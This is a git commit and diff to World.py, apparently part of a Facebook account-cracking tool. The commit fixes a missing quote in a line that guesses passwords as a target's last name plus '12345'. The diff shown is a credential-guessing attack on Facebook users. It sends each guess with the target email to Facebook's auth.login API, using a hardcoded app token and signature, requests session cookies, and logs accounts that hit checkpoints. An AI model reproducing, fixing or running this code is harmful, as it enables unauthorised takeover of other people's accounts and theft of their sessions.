f1ad44461e7774346d9ce7437bb9e3bea49022e3
lovehacker <61407838+lovehackerAsif@users.noreply.github.com>
2020-04-10 12:29:41 +0500

    Update World.py

--- World.py
+++ World.py
@@ -329,7 +329,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = b['last_name'] + '12345
+					pass2 = b['last_name'] + '12345'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
